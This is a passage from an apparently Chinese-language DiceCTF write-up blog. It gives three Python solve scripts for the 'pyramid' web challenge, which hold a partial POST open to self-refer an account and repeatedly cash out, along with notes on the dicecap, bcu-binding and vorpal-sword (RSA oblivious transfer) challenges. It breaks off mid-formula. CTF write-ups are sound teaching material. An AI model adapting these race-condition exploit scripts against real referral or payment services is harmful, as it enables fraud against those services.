class="string">&quot;Transfer-Encoding: chunked\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    ).<span class="built_in">format</span>(host=host)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    ssl_sock.send(request.encode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set-Cookie</span></span><br><span class="line">    response = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="string">b&#x27;\r\n\r\n&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response:  <span class="comment"># </span></span><br><span class="line">        response += ssl_sock.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    headers = response.split(<span class="string">b&#x27;\r\n\r\n&#x27;</span>)[<span class="number">0</span>].decode()</span><br><span class="line">    cookie_header = [line <span class="keyword">for</span> line <span class="keyword">in</span> headers.split(</span><br><span class="line">        <span class="string">&#x27;\r\n&#x27;</span>) <span class="keyword">if</span> <span class="string">&#x27;set-cookie:&#x27;</span> <span class="keyword">in</span> line.lower()][<span class="number">0</span>]</span><br><span class="line">    token = cookie_header.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;https://pyramid.dicec.tf/code&quot;</span></span><br><span class="line">    cookie = &#123;</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.get(url, cookies=cookie, verify=<span class="literal">True</span>)</span><br><span class="line">    code = re.findall(<span class="string">r&#x27;&lt;strong&gt;(.*?)&lt;/strong&gt;&#x27;</span>, res.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;code: <span class="subst">&#123;code&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># refer=code</span></span><br><span class="line">    refer_data = <span class="string">f&quot;name=attacker&amp;refer=<span class="subst">&#123;code&#125;</span>&quot;</span>.encode()</span><br><span class="line">    chunk2_length = <span class="built_in">format</span>(<span class="built_in">len</span>(refer_data), <span class="string">&#x27;x&#x27;</span>)  <span class="comment"># </span></span><br><span class="line">    chunk2 = <span class="string">f&quot;<span class="subst">&#123;chunk2_length&#125;</span>\r\n<span class="subst">&#123;refer_data.decode()&#125;</span>\r\n&quot;</span></span><br><span class="line">    ssl_sock.send(chunk2.encode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    ssl_sock.send(<span class="string">b&quot;0\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    ssl_sock.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] ExploitToken<span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line">    addRef(code)</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cashout</span>(<span class="params">token</span>):</span><br><span class="line">    url = <span class="string">&quot;https://pyramid.dicec.tf/cashout&quot;</span></span><br><span class="line">    cookie = &#123;</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    requests.get(url, cookies=cookie, verify=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    token = exploit()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">63</span>):</span><br><span class="line">        cashout(token)</span><br><span class="line">    res = requests.get(<span class="string">&quot;https://pyramid.dicec.tf/buy&quot;</span>,</span><br><span class="line">                       cookies=&#123;<span class="string">&quot;token&quot;</span>: token&#125;)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><code>V&amp;N</code><code>exp</code><code>socket</code><strong></strong><strong></strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">hostname = <span class="string">&#x27;pyramid.dicec.tf&#x27;</span></span><br><span class="line">url = <span class="string">f&#x27;http://<span class="subst">&#123;hostname&#125;</span>&#x27;</span></span><br><span class="line">context = ssl.create_default_context()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socket.create_connection((hostname, <span class="number">443</span>)) <span class="keyword">as</span> sock:</span><br><span class="line">    <span class="keyword">with</span> context.wrap_socket(sock, server_hostname=hostname) <span class="keyword">as</span> ssock:</span><br><span class="line">        ssock.send(<span class="string">b&#x27;POST /new HTTP/1.1\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Host: pyramid.dicec.tf\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Connection: keep-alive\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Keep-Alive: timeout=25\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Host: pyramid.dicec.tf\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Content-Length: 51\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;\r\n\r\n&#x27;</span>)</span><br><span class="line">        res = ssock.recv(<span class="number">4096</span>).decode()</span><br><span class="line">        token = re.search(<span class="string">r&quot;token=(\w+)&quot;</span>, res)[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] Token: <span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">        resp = requests.get(url + <span class="string">&#x27;/code&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">        code = re.search(<span class="string">r&quot;strong&gt;(\w+)&lt;/strong&quot;</span>, resp.text)[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] Code: <span class="subst">&#123;code&#125;</span>&#x27;</span>)</span><br><span class="line">        ssock.send(<span class="string">f&#x27;name=pepos&amp;refer=<span class="subst">&#123;code&#125;</span>&#x27;</span>.encode())</span><br><span class="line">        requests.post(url + <span class="string">&#x27;/new&#x27;</span>, data=&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;pepos&#x27;</span>, <span class="string">&#x27;refer&#x27;</span>: code&#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Generated self-referential user&#x27;</span>)</span><br><span class="line">        ssock.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">63</span>):</span><br><span class="line">    requests.get(url + <span class="string">&#x27;/cashout&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">res = requests.get(url + <span class="string">&#x27;/buy&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><code>discord</code><code>socket</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;https://pyramid.dicec.tf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># POST a request to /new but don&#x27;t send data yet</span></span><br><span class="line"><span class="comment"># We receive the cookie with our user token because of the server implementation</span></span><br><span class="line">r = remote(<span class="string">&#x27;pyramid.dicec.tf&#x27;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;POST /new HTTP/1.1\r\nHost: pyramid.dicec.tf:443\r\nContent-Length: 100\r\n\r\n&#x27;</span>)</span><br><span class="line">token = r.recv().decode().split(<span class="string">&#x27;token=&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;\r\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate a new code for our not totally created account</span></span><br><span class="line">res = requests.get(URL + <span class="string">&#x27;/code&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">code = res.text.split(<span class="string">&#x27;&lt;strong&gt;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&lt;/strong&gt;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Complete the initial registration with self-referral</span></span><br><span class="line">r.send(<span class="string">b&#x27;refer=&#x27;</span> + code.encode() + <span class="string">b&#x27;&amp;a=1&#x27;</span> * <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create another account so that our ref count is set to 1</span></span><br><span class="line">requests.post(URL + <span class="string">&#x27;/new&#x27;</span>, data=&#123;<span class="string">&#x27;refer&#x27;</span>: code&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit the /cashout exponential growth in case of self-referral</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">63</span>):</span><br><span class="line">    requests.get(URL + <span class="string">&#x27;/cashout&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Buy the flag</span></span><br><span class="line">res = requests.get(URL + <span class="string">&#x27;/buy&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><code>discord</code><strong>pwntools</strong><strong></strong></p><p><code>Python</code><code>requests</code></p><p></p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="dicecap"><a class="markdownIt-Anchor" href="#dicecap"></a> dicecap</h2><blockquote><p>As DiceGang havent won a CTF in 4 months, weve taken to more drastic measures to get to the top of the leaderboard - hacking our competitors! This pcap was gathered from a previous information gathering mission, can you find the flag?</p></blockquote><p><code>coolzip.zip</code><code>main</code><br /><img src="https://picx.zhimg.com/80/v2-7e1d5e967d495c54348dc24b5d8a0c8e_1440w.png" alt="" /><br /><code>ida</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">generate_password</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *src; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">6</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">10</span>]; <span class="comment">// [rsp+26h] [rbp-3Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">40</span>]; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = time(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%d&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(v1 - v1 % <span class="number">60</span>));</span><br><span class="line">  src = setlocale(<span class="number">6</span>, &amp;locale);</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, src, <span class="number">5uLL</span>);</span><br><span class="line">  dest[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">  v3 = getlogin();</span><br><span class="line">  <span class="built_in">strcat</span>(v6, s);</span><br><span class="line">  <span class="built_in">strcat</span>(v6, dest);</span><br><span class="line">  <span class="built_in">strcat</span>(v6, v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The password is:%s\n&quot;</span>, v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ChatGPT</code><br /><img src="https://picx.zhimg.com/80/v2-04d7b1da0e83ea1bef2f76e28652534d_1440w.png" alt="" /></p><p><code>1743126493</code><code>1743126480</code><br /><strong>password: 1743126480en_UShacker</strong><br /><code>dice&#123;5k1d_y0ur_w@y_t0_v1ct0ry_t0d4y!!!&#125;</code></p><h2 id="bcu-binding"><a class="markdownIt-Anchor" href="#bcu-binding"></a> bcu-binding</h2><blockquote><p>Comrades, we found this old manual in our basement. Can you see if theres anything interesting about it?</p></blockquote><p>PDF<br /><img src="https://pic1.zhimg.com/80/v2-0257e7475902470d41749e3ca81afe76_1440w.png" alt="" /><br /><code>OSCTF</code></p><p><br /><img src="https://pica.zhimg.com/80/v2-92abc36df6c3af108e5717f5862826ce_1440w.png" alt="" /><br /><code>FLAG: dice&#123;r3ad1ng_th4_d0cs_71ccd&#125;</code></p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="vorpal-sword"><a class="markdownIt-Anchor" href="#vorpal-sword"></a> vorpal-sword</h2><blockquote><p>Choose your own adventure!</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">DEATH_CAUSES = [</span><br><span class="line"><span class="string">&#x27;a fever&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;dysentery&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;measles&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cholera&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;typhoid&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;exhaustion&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a snakebite&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a broken leg&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a broken arm&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;drowning&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_ot</span>(<span class="params">key, msg0, msg1</span>):</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">https://en.wikipedia.org/wiki/Oblivious_transfer#12_oblivious_transfer</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">x0 = secrets.randbelow(key.n)</span><br><span class="line">x1 = secrets.randbelow(key.n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n: <span class="subst">&#123;key.n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e: <span class="subst">&#123;key.e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;x0: <span class="subst">&#123;x0&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;x1: <span class="subst">&#123;x1&#125;</span>&#x27;</span>)</span><br><span class="line">v = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;v: &#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="number">0</span> &lt;= v &lt; key.n, <span class="string">&#x27;invalid value&#x27;</span></span><br><span class="line">k0 = <span class="built_in">pow</span>(v - x0, key.d, key.n)</span><br><span class="line">k1 = <span class="built_in">pow</span>(v - x1, key.d, key.n)</span><br><span class="line">m0 = <span class="built_in">int</span>.from_bytes(msg0.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">m1 = <span class="built_in">int</span>.from_bytes(msg1.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">c0 = (m0 + k0) % key.n</span><br><span class="line">c1 = (m1 + k1) % key.n</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c0: <span class="subst">&#123;c0&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1: <span class="subst">&#123;c1&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">flag = f.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;=== CHOOSE YOUR OWN ADVENTURE: Vorpal Sword Edition ===&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;you enter a cave.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the tunnel forks ahead. do you take the left or right path?&#x27;</span>)</span><br><span class="line">key = RSA.generate(<span class="number">1024</span>)</span><br><span class="line">msgs = [<span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">page = secrets.randbits(<span class="number">32</span>)</span><br><span class="line">live = <span class="string">f&#x27;you continue walking. turn to page <span class="subst">&#123;page&#125;</span>.&#x27;</span></span><br><span class="line">die = <span class="string">f&#x27;you die of <span class="subst">&#123;secrets.choice(DEATH_CAUSES)&#125;</span>.&#x27;</span></span><br><span class="line">msgs = (live, die) <span class="keyword">if</span> secrets.randbits(<span class="number">1</span>) <span class="keyword">else</span> (die, live)</span><br><span class="line">run_ot(key, *msgs)</span><br><span class="line">page_guess = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;turn to page: &#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> page_guess != page:</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;you find a chest containing <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://lazzzaro.github.io/2021/06/20/crypto-%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/index.html"></a></p><p><strong>64</strong><br /><code>n e x0 x1 c0 c1</code><code>v</code><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mn>0</mn><mo></mo><mo stretchy="false">(</mo><mi>v</mi><mo></mo><mi>x</mi><mn>0</mn><msup><mo stretchy="false">)</mo><mi>d</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k0\equiv (v-x0)^{d}mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mord">0</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mn>1</mn><mo></mo><mo stretchy="false">(</mo><mi>v</mi><mo></mo><mi>x</mi><mn>1</mn><msup><mo stretchy="false">)</mo><mi>d</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k1\equiv(v-x1)^{d}mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>0</mn><mo></mo><mi>m</mi><mn>0</mn><mo>+</mo><mi>k</mi><mn>0</mn><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c0\equiv m0+k0\ mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">0</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>1</mn><mo></mo><mi>m</mi><mn>1</mn><mo>+</mo><mi>k</mi><mn>1</mn><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c1\equiv m1+k1\ mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mn>0</mn><mo separator="true">,</mo><mi>m</mi><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mi>l</mi><mi>i</mi><mi>v</mi><mi>e</mi><mo separator="true">,</mo><mi>d</mi><mi>i</mi><mi>e</mi><mo stretchy="false">)</mo><mi>o</mi><mi>r</mi><mo stretchy="false">(</mo><mi>d</mi><mi>i</mi><mi>e</mi><mo separator="true">,</mo><mi>l</mi><mi>i</mi><mi>v</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m0,m1=(live,die)or(die,live)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">m</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">m</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">e</span><span class="mclose">)</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></p><p>emm<strong></strong><code>VScode</code><code>copilot</code><code>tap</code><br /><code>live = f'you continue walking. turn to page &#123;page&#125;.'</code><br /><code>die = f'you die of &#123;secrets.choice(DEATH_CAUSES)&#125;.'</code></p><p><code>m0 = die</code><code>m1</code><code>m0</code><strong></strong><code>DEATH_CAUSES</code></p><p><code>k0,k1</code><code>v=(x0+x1)/2</code><br /><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mn>1</mn><mo></mo><mo stretchy="false">(</mo><mo></mo><mn>1</mn><msup><mo stretchy="false">)</mo><mi>d</mi></msup><mo></mo><mi>k</mi><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k1\equiv (-1)^{d}*k0(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"></span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><code>d</code><br /><span class="katex"><span class="katex-mathml"><math 